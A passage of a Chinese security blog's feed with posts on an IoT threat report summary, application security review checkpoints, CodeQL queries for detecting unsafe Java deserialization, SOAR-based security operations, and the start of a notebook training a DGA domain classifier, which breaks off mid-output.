<li>2、边界：NAC和Firewall结合（据笔者了解有些团队已经在做了）</li>
<li>3、安全：基于流量的威胁发现（笔者正在做的事情）</li>
<li>4、最优化：提高IoT设备的使用率</li>
<li>5、管理：实时监控、报警</li>
<li>6、回收：IoT设备的回收审计流程</li>
</ul>

<p><strong>最佳实践2：通过产品集成将安全性扩展到所有的IoT设备</strong></p>

<p>安全产品集成包括以下：</p>

<ul>
<li> Asset management and computerized maintenance management systems (CMMS)</li>
<li> Security information and event management (SIEM) </li>
<li> Security orchestration, automation, and response (SOAR) </li>
<li> Next-generation firewalls (NGFW) </li>
<li> Network access control (NAC) </li>
<li> Wireless/Network management solutions</li>
</ul>

<p><del>笔者总结</del></p>

<p>~~ 这个报告虽然篇幅较短，但是不得不说平底锅的盒子贵有贵的道理，这篇报告的绝大部分都击中了现在IoT环境，特别是泛IoT环境所面临的安全威胁，整体解决思路和笔者正在做的大致相同。不过报告并没有说到具体如何落地，和绝大多数安全厂商一样，有点空中楼阁的感觉。但是经过笔者去年的验证，这两个落地实践的可行性是没有问题的，但是如何落地，长路漫漫，一点一点来了。~~</p>

<p>报告地址：<a href="https://start.paloaltonetworks.com/unit-42-iot-threat-report?utm_source=marketo&amp;utm_medium=email&amp;utm_campaign=AMERICAS-DA-EN-20-03-10-7010g000001JJOZAA4-P3-Strata-Unit%2042%20IoT%20Report.Americas-DA-EN-20-03-10-XX-P3-Strata_IoT%20Report%20A/B">https://start.paloaltonetworks.com/unit-42-iot-threat-report?utm_source=marketo&amp;utm_medium=email&amp;utm_campaign=AMERICAS-DA-EN-20-03-10-7010g000001JJOZAA4-P3-Strata-Unit%2042%20IoT%20Report.Americas-DA-EN-20-03-10-XX-P3-Strata_IoT%20Report%20A/B</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[安全建设]应用安全评审中的三个关键节点及抓手实现]]></title>
    <link href="https://www.uxss.net/15982371354139.html"/>
    <updated>2020-08-24T10:45:35+08:00</updated>
    <id>https://www.uxss.net/15982371354139.html</id>
    <content type="html"><![CDATA[
<p>如何快速感知项目立项？如何感知应用上线？如何跟踪应用迭代？越权漏洞频发如何解决？</p>

<span id="more"></span><!-- more -->

<p><img src="media/15982371354139/15982649151296.jpg" alt=""/></p>

<h2 id="toc_0">前言</h2>

<p>应用安全如何做？这是一个老生常谈的问题，那为什么还要提这个话题呢？在笔者经历了短暂的两年多的应用安全建设来看，SDL的完整落地是一个很大的难题。当然，像其中的培训、代码扫描以及应急响应这几部分，各种落地方案很成熟，也就不提了。应用安全建设的本质就是运营，最难落地的差不多就是安全评审了。</p>

<p>如何进行安全评审，从方法论来看也不是什么难题，通过STRIDE威胁建模模型和DREAD威胁评级模型，再融入公司的实际情况，一份定制化的评审CheckList差不多就可以出炉了。然后问题就来了，在哪个环节切入？通过什么方式？如何持续运营？</p>

<h2 id="toc_1">安全评审需要介入的三个节点</h2>

<p>立项时、上线时、迭代时。</p>

<p><strong>立项时</strong>：根基不牢地动山摇，这个阶段需要进行架构安全评审。架构安全评审的必要性在于可以用最小的成本解决最大的风险，如果架构性安全问题在这个阶段未被发现，后续会随着一次次迭代，修复成本和风险都会急剧上升。</p>

<p><strong>上线时</strong>：现在的白盒扫描，更多的是发现代码层漏洞，但是对于架构相关和业务相关的风险，就有心无力了。这也就引出了应用上线安全评审的必要性，验证立项评审阶段的风险是否存在，同时评审其有没有业务逻辑相关风险(越权、敏感信息等)。</p>

<p><strong>迭代时</strong>：现在的开发思路大多都是快速立项、快速上线、持续迭代，也就导致了大部分的功能是在后期迭代过程中上线的，经过笔者的简单统计，当应用完成度在90%以上时，迭代新增的接口约占80%以上，换句话说，绝大多数的web接口都没有经过安全评审就暴露到公网当中去了，成为无数的攻击面，进而导致了权限相关安全风险的频发。</p>

<h2 id="toc_2">立项时--快速感知</h2>

<p>如何做到快速感知？笔者了解到的有这么几种：</p>

<p><strong>一是和PD混熟</strong>，有新项目时及时同步，这种方法具有局限性，适合应用比较少的公司或者公司的某条业务线；</p>

<p><strong>二是利用现有平台</strong>，往往在中台支撑部门、工程效能部门等，会有一些环节可以感知到立项，财务部门也是一个非常好的环节。这个时候就要发挥敏锐的嗅觉，找到这样的点，然后形成联动。这些平台大概率会接受合作，一则可以提升该平台的价值，二来可以提升其影响力；</p>

<p><strong>三是自立门户成为入口</strong>，这种方案的思想是让项目在安全平台上立项，想要实现需要运气。为什么这么说呢，想要做这件事，需要大量的人员投入和强制的流程更改，能决定这事的往往需要CXO的支持，要想获得他们的支持，就需要一个影响足够大的安全风险。不过据笔者所知，有几家大公司就是这么做的。</p>

<p>第一种方案，灵活性太强，效果时好时坏，笔者在很长一段时间里都是用这种方法，最后的结果很惨，随着业务的迅速发展，项目评审率跌至很低的水位。</p>

<p>第二种方案的可行性非常强，是一个成本低效果好的抓手。但是有一个问题是，项目非常多怎么办？笔者现在的思路是按照项目的等级来评审，项目等级的划分有很多种方法，例如人日、业务线等等</p>

<p>第三种方案就不提了，时刻准备着，机会来了抓紧。</p>

<p>当找到了有效的抓手时，一定要记得带上数据安全、业务安全等，这个阶段的主要风险往往集中在风控、合规等。</p>

<h2 id="toc_3">上线时--发布卡点</h2>

<p>上线发布卡点，这个做起来就非常容易了，嵌入到应用构建平台中去就可以实现。有一个问题是，为什么不每次发布都卡点呢？</p>

<p>其实去看一下构建平台的发布记录就知道了，过于频繁，完全无法运营，所以只能退而求其次，卡住第一次上线发布。</p>

<h2 id="toc_4">迭代时--持续跟踪</h2>

<p>上边说到“<strong>迭代新增的接口约占80%以上</strong>”，这就是一个超级大风险，迭代接口的安全性全依赖于开发的安全意识和应急响应。虽然在上线后会有持续的黑盒扫描，但是目前还没有哪个工具可以低误报、低风险的发现权限相关漏洞吧。</p>

<p>在上线评审那里有说到过，构建平台的发布记录非常多，如果依赖这个去评审迭代，会消耗大量的精力，当应用只有两位数时还能勉强运营，但是当应用数量上升到几百、几千的时候，每天最多迭代几十万行代码，怕是不吃不喝也搞不定了。</p>

<p>这里讲一下笔者的思路，<strong>commit监控</strong>：</p>

<pre><code class="language-text">1、每隔一段时间自动拉取commit记录；
2、获取应用源码进行解析（白盒代码扫描工具中大多都可以做到源码解析，笔者是自己实现的）；
3、解析diff记录，获取新增web接口；
4、通过污点跟踪结合关键方法(permission等)大致判断风险指数(这个笔者实现起来效果不是很好，几乎每个应用都有自己独特的鉴权逻辑，通用程度低)。
</code></pre>

<p>只需要这几步，即可以实现应用新增web接口的跟踪。可能还有一些其它通用接口平台，其实跟踪思想也是类似。</p>

<p>不过在笔者的运营过程中发现，还是会存在新增接口过多的情况，现在采用的是优先级的方案（重点应用、发生过高危风险的应用等），发现新增接口后，大部分情况下，人工快速审计下代码就可以发现风险了，当然还是会存在各种奇葩的鉴权逻辑，这时候就要和开发交流了。</p>

<p>这段时间的运营感受就是，随着覆盖应用的增多，每天要读代码量也开始快速上升，不过效果还是很明显的。第4点的自动化分析需求愈加迫切。</p>

<h2 id="toc_5">总结</h2>

<p>总结下就是，三个节点，关键之处在于找到这三个节点的抓手，充分利用现有资源，如果实在没有，那就创造抓手。用技术的思路去做运营，用创业的心态去做产品。</p>

<p>本文纯属笔者的经验之谈，如有偏颇之处，还望指出，不甚感谢。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[JAVA安全]利用CodeQL寻找Java Deserialization Vulnerabilities]]></title>
    <link href="https://www.uxss.net/15982365857946.html"/>
    <updated>2020-08-24T10:36:25+08:00</updated>
    <id>https://www.uxss.net/15982365857946.html</id>
    <content type="html"><![CDATA[
<p>Github发布CodeQL后，一直保持着关注，从17年就有类似的想法在尝试，在CodeQL中有很多不谋而合的点，查询语句刚上手虽然有些别扭，稍微适应了下感觉还好，值得好好学习一下</p>

<span id="more"></span><!-- more -->

<p><img src="media/15982365857946/15982651286758.jpg" alt=""/></p>

<p>接下来看一下如何发现Java Deserialization Vulnerabilities。</p>

<p>攻击者在Java应用 <code>deserialization</code>时注入不可信数据进而可以执行任意代码。</p>

<p><code>java.io.ObjectInputStream</code>中的 <code>readObject</code>是个危险方法。常见的用法如下：</p>

<pre><code class="language-text">ObjectInputStream ois = new ObjectInputStream(input);
MyObject obj = (MyObject)ois.readObject();
</code></pre>

<p><code>readObject</code>方法的作用是从数据流中读取并返回该对象。那么我们都知道当构造序列化数据时插入恶意代码，则可以在 <code>deserialization</code>时产生非预期结果，甚至可以执行任意代码。</p>

<h2 id="toc_0">使用CodeQL发现不安全的deserialization</h2>

<p>我们可以使用CodeQL来发现 <code>deserialization</code>漏洞，当然我们首先找到 <code>deserialization</code>进行的位置，然后需要跟踪不可信的数据是否可以到达 <code>deserialization</code>调用方法。</p>

<p>首选我们编写一个查询语句去寻找 <code>readObject</code>调用。</p>

<pre><code class="language-text">import java

from MethodAccess call, Method readobject
where  
    call.getMethod() = readobject and  
    readobject.hasName(&quot;readObject&quot;) and  
    readobject.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;)
select call
</code></pre>

<p>这段codeql代码的意思是寻找名称为 <code>readObject</code>且类型为 <code>java.io.ObjectInputStream</code>的方法。</p>

<p>上文这段代码会返回很多结果，其中大部分都是安全的。因此我们要定位到那些可读取脏数据的调用上。进行污点跟踪主要靠 <code>RemoteFlowSource</code>和 <code>flowsTo</code>。<code>RemoteFlowSource</code>的作用是发现可以由用户控制的输入点，例如http请求参数。谓词 <code>flowsTo</code>的作用是监控数据流是否从 <code>source</code>到达 <code>sink</code>。</p>

<p>首先将查询重构为一个类，来定义我们感兴趣的 <code>sink</code>。也就是 <code>readObject</code>的调用集合，这里是脏数据流入的地方。</p>

<pre><code class="language-text">class UnsafeDeserializationSink extends Expr {  
    UnsafeDeserializationSink() {    
        exists(MethodAccess call, Method readobject | 
        call.getMethod() = readobject and     
        readobject.hasName(&quot;readObject&quot;) and      
        readobject.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;) and      
        this = call.getQualifier()    )  
        }
}
</code></pre>

<p>接下来我们定义 <code>sink</code>， <code>source</code>定义于 <code>RemoteFlowSource</code>，完整的查询语句如下。</p>

<pre><code class="language-text">import java

import semmle.code.java.security.DataFlow

class UnsafeDeserializationSink extends Expr {
    UnsafeDeserializationSink() {    
        exists(MethodAccess call, Method readobject |      
        call.getMethod() = readobject and      
        readobject.hasName(&quot;readObject&quot;) and      
        readobject.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;) and     
    this = call.getQualifier()    )  
    }
}

from RemoteFlowSource source, UnsafeDeserializationSink sink
where source.flowsTo(sink)
select source, sink
</code></pre>

<p>当然，上边只查询了 <code>java.io.ObjectInputStream.readObject</code>这一个方法，其它反序列化框架也有类似的漏洞，例如Kryo、XmlDecoder、XStream、SnakeYaml等。</p>

<p>完整的反序列化漏洞查询语句如下。</p>

<pre><code class="language-text">import java
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.security.UnsafeDeserialization
import DataFlow::PathGraph

class UnsafeDeserializationConfig extends TaintTracking::Configuration {  
    UnsafeDeserializationConfig() { this = &quot;UnsafeDeserializationConfig&quot; }
    override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource }
    override predicate isSink(DataFlow::Node sink) { sink instanceof UnsafeDeserializationSink }
    }
from DataFlow::PathNode source, DataFlow::PathNode sink, UnsafeDeserializationConfig conf
where conf.hasFlowPath(source, sink)
select sink.getNode().(UnsafeDeserializationSink).getMethodAccess(), source, sink,  &quot;Unsafe deserialization of $@.&quot;, source.getNode(), &quot;user input&quot;
</code></pre>

<p>参考链接：<a href="https://lgtm.com/rules/1823453799/">https://lgtm.com/rules/1823453799/</a> <a href="https://securitylab.github.com/research/insecure-deserialization">https://securitylab.github.com/research/insecure-deserialization</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[安全建设]从SOAR(安全编排自动化与响应)中求解安全运营之法]]></title>
    <link href="https://www.uxss.net/15982364930555.html"/>
    <updated>2020-08-24T10:34:53+08:00</updated>
    <id>https://www.uxss.net/15982364930555.html</id>
    <content type="html"><![CDATA[
<p>凡学问者，皆有术法道三大层次。法者，于术精通而升华成理，复以理指导术之提高，学问之提高层次。达于法者，达中乘也。</p>

<span id="more"></span><!-- more -->

<p><img src="media/15982364930555/15982653176360.jpg" alt=""/></p>

<h3 id="toc_0">个人理解的企业应用安全建设</h3>

<p>参与企业应用安全建设两年有余，在公司的应用安全建设比较早期的时候参与进来，最近一年又有幸深度参与了多家中小型公司的应用安全建设，无论是基于云安全平台还是基于自研平台的企业安全建设都有了些许思考。也渐渐构建起了自己的安全观，<strong>“企业安全建设是一个动态博弈需要持续投入的过程。安全是业务的一个重要属性，是业务的核心竞争力之一，应用安全的本质是运营。安全建设更重要的是看待安全问题的思路、角度和高度。攻防之道，相辅相成。”</strong></p>

<p>什么是运营，一切围绕着网站产品进行的人工干预都叫运营，那什么又是强运营呢，直白点就是需要大量人工参与、与其它角色大量沟通的运营。从笔者的角度来看，企业安全建设就是一个强运营的工作，尤其是在安全建设后期，平台、工具、制度相对完善之后。大量的运营使人痛苦，尤其对技术安全运营来说尤甚，所以在很长的时间里思考这个困境的解法，有了些许思路，通过本文中将自己对企业安全中应用安全建设的思考和大家分享下。</p>

<h5 id="toc_1">当企业开始应用安全建设时，一般会经历这几个阶段：采购阶段、自研阶段、产品闭环，以期实现高效运营的目标。</h5>

<h3 id="toc_2">采购阶段</h3>

<p>这个阶段相信很多经历过“一个人的安全部”的都会深有感触，简单调研之后，大概率会发现这样一个事实————“一穷二白”，好一点的可能运维或IT同学已经做了一部分，例如系统漏洞、高危端口等，但很明显远远不够的。这时候就要开始采购安全产品了，“管它好不好用，先止血”。对各个乙方的安全解决方案进行调研，在各个开源社区寻找各类开源安全工具、平台，在耗费了大量精力和经历安全预算申请的绝望后，终于部署了防火墙、IDS等安全产品，从开源社区找到了SOC平台、扫描器、风控平台等开源安全产品。枪有了，能不能打道猎物还是要看人。同样，安全产品怎么来用才能发挥最大价值是个值得思考的事情，需要大量的内部调研，尝试与已有的流程、机制、产品进行配合，以及如何得到高层的帮助，这就需要大家各显神通了。</p>

<p>在对接时，会发现在不经过二次开发的情况下很难实现有效的配合，更多的是在各自为战。与此同时，需要对这些产品进行运营，处理报警日志、漏洞扫描、漏洞的推动修复、应用上线审核、活动风险控制、各类安全应急等等，现阶段如果想要全部一手抓，难度有点大。笔者认为，<strong>在甲方做企业安全建设，最终还是要对结果负责，对于安全效果，有两个指标是最关键的核心指标，一个是漏洞/事件数，一个是安全产品覆盖面。</strong></p>

<p>所以在初期阶段没法全覆盖的情况下，<strong>最有效的办法是找到业务最痛最关心的点，重点保障，得到认可。通过短期快速止血和长期安全机制建设相结合的方法迭代改进来度过这一阶段</strong>。为什么要找到业务最痛最关心的点呢？企业的安全是100%服务保障业务的，业务永远是第一位的，有业务才有安全。(当然如果公司的业务都是基于云产品部署的，那可以直接跳过这一阶段了，云平台提供的一整套安全产品对于基本的安全保障还是很有效的。)</p>

<h3 id="toc_3">自研阶段</h3>

<p>经历了采购阶段安全建设后，有了一定的安全水位，安全团队的配置也得到相应的提高，在基于开源或采购的安全产品进行运营时，被大量平台之间的协作搞得焦头烂额，迫切的需要开始安全平台的部分自研。</p>

<p>在这提一嘴安全团队的建设，笔者认为的安全团队组成主要有攻防、运营、开发三部分组成，其中开发又分为安全工具开发和安全平台开发，其中的区别在于安全工具开发需要专业的攻防能力，而安全平台开发则更侧重于开发本身，<strong>专业的人做专业的事</strong>，让一个安全同学去开发一个安全运营平台与现有的代码构建等平台进行对接是一件很困难的事情，所以就需要专业的开发来做这部分工作。</p>

<p>没有哪套安全解决方案可以应用在所有企业上，这就需要安全团队针对当前的业务模式、系统架构、发布流程等针对性的开发一些工具或平台来使安全解决方案更契合当前企业的技术栈。</p>

<p>例如SDL中的应用发布流程，其中最重要的莫过于发布卡点，卡点又要依赖代码安全扫描，而每个公司使用的开发框架往往不同，甚至在某些公司会对开发框架进行大量的修改，这种情况下通用的代码扫描就不可靠了，就需要对代码安全扫描器进行改造或自研，然后扫描出的漏洞需要通过漏洞运营平台来管理，如何修复对于开发来说也是个棘手的问题，要解决快速修复的问题就需要完整的代码级解决方案，好多公司都有安全包的组件供开发使用。例子只是其中的一个点，这一阶段往往是漫长的，平台和工具会经过一次次的迭代，最终和业务达到和平共处的状态。</p>

<p>为什么需要专业的开发，一个很重要的原因是需要工程化的能力，这里引用《赵彦的CISO闪电战：两年甲方安全修炼之路》中的一句话，<strong>“工程化能力体现在能把自研的安全产品、安全系统落地于海量分布式环境，落地于规模庞大的组织的IT系统上，且不降低性能，不影响可用性，不出故障和运营事故”</strong>。</p>

<p>因为安全产品导致的大型故障发生过很多起，安全产品有时候就是一个双刃剑，例如WAF，既能挡住恶意攻击，也有可能会把正常用户拒之门外。如果安全自身把业务给搞瘫痪了，那要安全还有何用，在很多情况下，稳定性往往是高于安全性的，凸显出工程化体系化的重要性。</p>

<h3 id="toc_4">产品闭环</h3>

<p>每个企业的安全思路都是不完全相同的，经过了自研阶段后，会形成自己企业特有的安全建设解决方案。漫长的自研阶段度过后，可能会有同学认为“纵深防御体系”（<strong>笔者理解的纵深防御，从系统、中间件、网络、应用、业务等各个环节布控，一道道防线由外到内共同组成整个防御体系</strong>）已经建设完成。从产品上来说，或许是的。但是从安全运营的角度来看，当前每个产品都还是孤立的点，产品之间的联动更多的是靠人工运营。</p>

<p>拿漏洞的运营举例，一个漏洞的生命周期通常是漏洞产生（SRC、内部发现、工具发现、威胁情报）、漏洞确认（是否误报、定级）、漏洞分配（对应的开发修复）、修复审核（是否修复以及修复方案的健壮性）、漏洞关闭，这其中就需要SRC、工具、TIP、SOC、开发中台、SIEM等平台的联动，来实现漏洞生命周期的闭环。类似闭环还有很多，但是工具类的产品闭环往往不是那么容易，这时可以寻找突破点，做产品的小闭环。</p>

<h3 id="toc_5">运营的痛点：安全人员短缺、报警数量多、处置速度无法保证、处置经验有效沉淀少、威胁态势愈加危险和复杂等等</h3>

<p>往往在安全产品闭环阶段后，技术安全团队的大小会稳定下来甚至会缩小，应用安全运营人员也会越来越少，在笔者看来这是一个正常的进化过程。但是业务的扩张并没有停止，应用也是一刻不停发布上线，随着企业规模越来越大，暴露的攻击面也越来越广，各类报警、漏洞大量增加，在有限的人力下，处置速度和经验沉淀很难有保障，更不用说现在大环境下安全形势了。</p>

<p>求变之心愈加强烈。</p>

<h3 id="toc_6">SOAR是否是一剂良药？</h3>

<p>思考这个问题很久了，<strong>应用安全建设强运营的困境该如何去突围？</strong> 从最初的鼓吹AI到回归现实，终于从SOAR(安全编排自动化与响应)中看到些许希望。</p>

<p>简单介绍一下SOAR，SOAR是Gartner 2018年在安全领域定义的最新前沿技术，与UEBA、EDR等侧重于威胁识别发现的技术不同，SOAR集中在识别后的威胁处理，强调用户可以通过事件编排中心通过编码实现任意的威胁处理逻辑。</p>

<p>SOAR 是一系列技术的合集，它能够帮助企业和组织收集安全运维团队监控到的各种信息（包括各种安全系统产生的告警），并对这些信息进行事件分析和告警分诊。然后在标准工作流程的指引下，利用人机结合的方式帮助安全运维人员定义、排序和驱动标准化的事件响应活动。SOAR 工具使得企业和组织能够对事件分析与响应流程进行形式化的描述。</p>

<p>SOAR相关的安全产品在国外国内都已经有安全公司进入到这个领域，但是在本文中，不去讨论具体的实现和产品，而是将其视作一个<strong>方法论</strong>，领会它的思路，尝试将其融入到产品自研和产品闭环中去。</p>

<p>看一下SOAR的组成，编排、自动化、响应，其实从名字中已经给了我们答案，笔者认为，最核心的思想在于Orchestration和Automation，<strong>先将事件处理流程或其它的流程通过编排的方式形成闭环，然后对其中大量重复工作的部分进行自动化。</strong> 至于响应，也是同理，具体的以后详谈。</p>

<p>有一点需要明确，<strong>目前通过应用SOAR来实现全自动组织和缓解的情况非常罕见，安全没有银弹，大多数缓解和阻断仍然需要安全人员的参与</strong>。但是SOAR的思想非常值得借鉴，尤其是在经历采购阶段、产品自研、产品闭环这几个阶段后，思考能不能通过SOAR的方法论来减轻工作量。</p>

<p>例如漏洞扫描的流程，发现、上报、分配确认、修复确认，其中发现、上报、修复确认均可以实现自动化，再比如各类安全警报的处理也可以应用这套方法论。</p>

<p>让专业的人来处理专业的事，用自动化来处理重复工作，或许是突围应用安全强运营困境的一个解法。SOAR目前还处于成长期，保持期待和不断探索。</p>

<p>Modern Security Operations Center = SOAR + SIEM + UEBA + OTHER</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]DGA Domain Detection 2]]></title>
    <link href="https://www.uxss.net/15387556906580.html"/>
    <updated>2018-10-06T00:08:10+08:00</updated>
    <id>https://www.uxss.net/15387556906580.html</id>
    <content type="html"><![CDATA[
<p><img src="media/15387556906580/15982653615268.jpg" alt=""/></p>

<p>接上文 <a href="https://uxss.net/DGA%20Domain%20Detection%20%5BRandom%20Forest%5D.html">DGA Domain Detection 1</a></p>

<span id="more"></span><!-- more -->

<pre><code class="language-python">import os
import random
import tldextract
import sklearn
import pandas as pd
import numpy as np

from keras.models import Sequential, load_model
from keras.preprocessing import sequence
from keras.layers.core import Dense, Dropout, Activation
from keras.layers.embeddings import Embedding
from keras.layers.recurrent import LSTM
from sklearn import feature_extraction
from sklearn.model_selection import train_test_split
from datetime import datetime
from zipfile import ZipFile
</code></pre>

<pre><code class="language-python">alexa_dataframe = pd.read_csv(&#39;data/top-1m.csv&#39;, names=[&#39;rank&#39;,&#39;uri&#39;], header=None, encoding=&#39;utf-8&#39;)
alexa_dataframe.info()
alexa_dataframe.head()
</code></pre>

<pre><code class="language-text">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
RangeIndex: 1000000 entries, 0 to 999999
Data columns (total 2 columns):
rank    1000000 non-null int64
uri     1000000 non-null object
dtypes: int64(1), object(1)
memory usage: 15.3+ MB
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>rank</th>
      <th>uri</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>1</td>
      <td>google.com</td>
    </tr>
    <tr>
      <th>1</th>
      <td>2</td>
      <td>youtube.com</td>
    </tr>
    <tr>
      <th>2</th>
      <td>3</td>
      <td>facebook.com</td>
    </tr>
    <tr>
      <th>3</th>
      <td>4</td>
      <td>baidu.com</td>
    </tr>
    <tr>
      <th>4</th>
      <td>5</td>
      <td>wikipedia.org</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">def load_data_set(filename):
    fw = open(&#39;data/dga_domain.txt&#39;, &#39;w+&#39;)
    with open(filename, &quot;r&quot;) as f:
        for line in f.readlines():
            lineArr = line.strip().split(&#39;\t&#39;)
            fw.write(lineArr[1] + &#39;\n&#39;)
    fw.close()
load_data_set(&#39;data/dga.txt&#39;)
</code></pre>

<pre><code class="language-python">dga_dataframe = pd.read_csv(&#39;data/dga_domain.txt&#39;, names=[&#39;raw_domain&#39;], header=None, encoding=&#39;utf-8&#39;)
dga_dataframe.info()
dga_dataframe.head()
</code></pre>

<pre><code class="language-text">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
RangeIndex: 1158695 entries, 0 to 1158694
Data columns (total 1 columns):
raw_domain    1158695 non-null object
dtypes: object(1)
memory usage: 8.8+ MB
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>raw_domain</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>ogxbnjopz.biz</td>
    </tr>
    <tr>
      <th>1</th>
      <td>zyejwiist.net</td>
    </tr>
    <tr>
      <th>2</th>
      <td>buuqogz.com</td>
    </tr>
    <tr>
      <th>3</th>
      <td>vpjmomduqll.org</td>
    </tr>
    <tr>
      <th>4</th>
      <td>uakwifutnpn.biz</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">def domain_extract(uri):
    ext = tldextract.extract(uri)
    if (not ext.suffix):
        return None
    else:
        return ext.domain
    
alexa_dataframe[&#39;domain&#39;] = [ domain_extract(uri) for uri in alexa_dataframe[&#39;uri&#39;]]
del alexa_dataframe[&#39;rank&#39;]
del alexa_dataframe[&#39;uri&#39;]
alexa_dataframe = alexa_dataframe.dropna()
alexa_dataframe = alexa_dataframe.drop_duplicates()
alexa_dataframe[&#39;length&#39;] = [len(x) for x in alexa_dataframe[&#39;domain&#39;]]
alexa_dataframe = alexa_dataframe[alexa_dataframe[&#39;length&#39;] &gt; 6]
alexa_dataframe.info()
alexa_dataframe.head()
</code></pre>

<pre><code class="language-text">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
Int64Index: 718018 entries, 1 to 999999
Data columns (total 2 columns):
domain    718018 non-null object
length    718018 non-null int64
dtypes: int64(1), object(1)
memory usage: 16.4+ MB
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>length</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>1</th>
      <td>youtube</td>
      <td>7</td>
    </tr>
    <tr>
      <th>2</th>
      <td>facebook</td>
      <td>8</td>
    </tr>
    <tr>
      <th>4</th>
      <td>wikipedia</td>
      <td>9</td>
    </tr>
    <tr>
      <th>11</th>
      <td>instagram</td>
      <td>9</td>
    </tr>
    <tr>
      <th>13</th>
      <td>twitter</td>
      <td>7</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">alexa_dataframe[&#39;class&#39;] = &#39;legit&#39;
#对正常数据打标legit
alexa_dataframe.head()
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>length</th>
      <th>class</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>1</th>
      <td>youtube</td>
      <td>7</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>2</th>
      <td>facebook</td>
      <td>8</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>4</th>
      <td>wikipedia</td>
      <td>9</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>11</th>
      <td>instagram</td>
      <td>9</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>13</th>
      <td>twitter</td>
      <td>7</td>
      <td>legit</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python"># Shuffle the data (important for training/testing)
alexa_dataframe = alexa_dataframe.reindex(np.random.permutation(alexa_dataframe.index))
#打乱循序，重新索引
#Randomly permute a sequence, or return a permuted range
alexa_total = alexa_dataframe.shape[0]
print(&#39;Total Alexa domains %d&#39; % alexa_total)
</code></pre>

<pre><code class="language-text">Total Alexa domains 718018
</code></pre>

<pre><code class="language-python">dga_dataframe[&#39;domain&#39;] = dga_dataframe.applymap(lambda x: x.split(&#39;.&#39;)[0].strip().lower())
#This method applies a function that accepts and returns a scalar to every element of a DataFrame.
del dga_dataframe[&#39;raw_domain&#39;]
</code></pre>

<pre><code class="language-python">dga_dataframe = dga_dataframe.dropna()
dga_dataframe = dga_dataframe.drop_duplicates()
dga_dataframe[&#39;length&#39;] = [len(x) for x in dga_dataframe[&#39;domain&#39;]]
dga_dataframe = dga_dataframe[dga_dataframe[&#39;length&#39;] &gt; 6]
dga_total = dga_dataframe.shape[0]
print(&#39;Total DGA domains %d&#39; % dga_total)
</code></pre>

<pre><code class="language-text">Total DGA domains 1082010
</code></pre>

<pre><code class="language-python">dga_dataframe[&#39;class&#39;] = &#39;dga&#39;
dga_dataframe.head()
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>length</th>
      <th>class</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>ogxbnjopz</td>
      <td>9</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>1</th>
      <td>zyejwiist</td>
      <td>9</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>2</th>
      <td>buuqogz</td>
      <td>7</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>3</th>
      <td>vpjmomduqll</td>
      <td>11</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>4</th>
      <td>uakwifutnpn</td>
      <td>11</td>
      <td>dga</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">all_domains = pd.concat([alexa_dataframe[:5000], dga_dataframe[:5000]], ignore_index=True)
#
all_domains.head(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
